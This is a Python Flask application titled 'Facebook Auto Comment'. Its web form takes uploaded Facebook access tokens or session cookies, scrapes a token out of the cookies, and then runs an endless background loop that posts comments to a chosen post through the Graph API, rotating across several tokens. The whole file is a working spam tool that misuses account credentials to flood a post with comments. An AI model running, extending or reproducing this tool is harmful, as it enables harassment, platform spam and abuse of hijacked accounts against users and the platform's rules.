from flask import Flask, request, render_template_string
import os
import threading
import time
import requests
import json

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "tokens.txt")
COOKIES_FILE = os.path.join(DATA_DIR, "cookies.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comments.txt")
POST_FILE = os.path.join(DATA_DIR, "post_url.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")

# Data Save करने का Function
def save_data(token_file, cookies_file, comment_file, post_url, delay):
    if token_file:
        token_file.save(TOKEN_FILE)
    if cookies_file:
        cookies_file.save(COOKIES_FILE)

    comment_file.save(COMMENT_FILE)

    with open(POST_FILE, "w") as f:
        f.write(post_url.strip())
    
    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

# Cookies से Token निकालने का Function
def extract_token_from_cookies():
    try:
        with open(COOKIES_FILE, "r") as f:
            cookies = f.read().strip()

        headers = {"User-Agent": "Mozilla/5.0"}
        url = "https://business.facebook.com/business_locations"

        response = requests.get(url, headers=headers, cookies={"cookie": cookies})
        token = response.text.split('["EA')[1].split('"')[0]
        return "EA" + token
    except Exception as e:
        print(f"[!] Error extracting token: {e}")
        return None

# Auto Comment Function
def send_comments():
    try:
        tokens = []
        if os.path.exists(TOKEN_FILE):
            with open(TOKEN_FILE, "r") as f:
                tokens = f.read().strip().split("\n")

        if not tokens and os.path.exists(COOKIES_FILE):
            extracted_token = extract_token_from_cookies()
            if extracted_token:
                tokens.append(extracted_token)

        if not tokens:
            print("[!] No valid tokens or cookies found.")
            return

        with open(COMMENT_FILE, "r") as f:
            comments = f.read().strip().split("\n")

        with open(POST_FILE, "r") as f:
            post_url = f.read().strip()

        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        if not comments or not post_url:
            print("[!] Missing comments or post URL.")
            return

        # Extract Post ID from URL
        post_id = post_url.split("/")[-1]

        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}

        token_index = 0
        comment_index = 0
        while True:
            token = tokens[token_index]
            comment = comments[comment_index]

            url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
            payload = json.dumps({"access_token": token, "message": comment})

            response = requests.post(url, data=payload, headers=headers)
            if response.ok:
                print(f"[+] Comment sent: {comment}")
            else:
                print(f"[x] Failed: {response.status_code} {response.text}")

            time.sleep(delay)

            token_index = (token_index + 1) % len(tokens)
            comment_index = (comment_index + 1) % len(comments)

    except Exception as e:
        print(f"[!] Error: {e}")

# HTML Form
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Auto Comment</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { background: #111; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }
        h1 { color: #00ffcc; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin: 10px 0 5px; }
        input, button { padding: 10px; border: 1px solid #444; border-radius: 5px; background: #222; color: white; margin-bottom: 10px; }
        button { background-color: #00ffcc; color: black; cursor: pointer; }
        button:hover { background-color: #00cc99; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Facebook Auto Comment</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label>Upload Token File (.txt) or Cookies File (.txt):</label>
            <input type="file" name="token_file" accept=".txt">
            <input type="file" name="cookies_file" accept=".txt">

            <label>Upload Comments File (.txt):</label>
            <input type="file" name="comment_file" accept=".txt" required>

            <label>Enter Post URL:</label>
            <input type="text" name="post_url" placeholder="https://www.facebook.com/123456789012345" required>

            <label>Delay in Seconds:</label>
            <input type="number" name="delay" value="5" min="1">

            <button type="submit">Submit</button>
        </form>
        <footer>© 2025 Server Created by Perfect Loser King</footer>
    </div>
</body>
</html>
"""

# Flask Route
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token_file = request.files.get("token_file")
        cookies_file = request.files.get("cookies_file")
        comment_file = request.files.get("comment_file")
        post_url = request.form.get("post_url")
        delay = int(request.form.get("delay", 5))

        if comment_file and post_url:
            save_data(token_file, cookies_file, comment_file, post_url, delay)
            threading.Thread(target=send_comments, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
